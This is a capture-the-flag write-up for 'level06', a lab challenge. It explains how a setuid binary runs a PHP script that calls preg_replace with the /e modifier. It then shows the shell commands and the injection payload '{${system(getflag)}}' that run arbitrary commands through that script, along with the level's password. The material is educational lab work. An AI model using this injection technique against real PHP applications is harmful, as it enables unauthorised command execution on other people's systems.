# LEVEL 06

## 💡 Explanation

In this level we have to:
1. We check the permissions of the files: `-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06`
2. Then, we check the content of `level06`, we can see that it executes the file `level06.php`
3. The file `level06.php`is calling the function `preg_replace`passing `e` as modifier => Deprecated since it executes the matching string!
4. We have to build a string that executes `getflag` and matches the regex => Something like `[x getflag]`
5. Last step, we need to get the output of the command, not the command itself... => `{${system(getflag)}}` Voilà!

## 👾 Commands

```
strings level06 => /usr/bin/php /home/user/level06/level06.php
echo '[x pwd]' > /tmp/lol; ./level06 /tmp/lol lol
echo '[x {$blub}]' > /tmp/lol; ./level06 /tmp/lol lol
echo '[x {${system(ls)}}]' > /tmp/lol; ./level06 /tmp/lol lol
echo '[x {${system(getflag)}}]' > /tmp/lol; ./level06 /tmp/lol lol
```

## 🔍 Resources

- [PHP preg_replace command - Errors/Exceptions](https://www.php.net/manual/en/function.preg-replace.php#refsect1-function.preg-replace-errors)
- [How to exploit preg_replace /e (1)](https://captainnoob.medium.com/command-execution-preg-replace-php-function-exploit-62d6f746bda4)
- [How to exploit preg_replace /e (2)](https://isharaabeythissa.medium.com/command-injection-preg-replace-php-function-exploit-fdf987f767df)
- [How to exploit preg_replace /e (3)](https://www.yeahhub.com/code-execution-preg_replace-php-function-exploitation/)
- [How to get the return value of a function](https://www.php.net/manual/en/language.types.string.php#language.types.string.parsing.complex)

## 🔥 Password
`wiok45aaoguiboiki2tuin6ub`
